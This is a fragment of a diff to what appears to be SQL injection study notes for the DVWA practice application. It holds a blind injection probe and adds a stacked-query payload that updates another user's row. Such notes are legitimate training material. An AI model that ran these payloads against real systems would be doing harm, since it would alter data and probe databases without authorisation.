@@ -1415,6 +1415,7 @@ sample2:
 select first_name,last_name from users where user_id ='1' and substring(database(),1,4)='dvwa'
 ===================================================================================
 MySQL===================================================================================
+SELECT first_name,last_name FROM users where user_id='1';update users set user='1337' WHERE USER_ID=3;select first_name,last_name from users where user_id='1'  #
 
 
 ===================================================================================
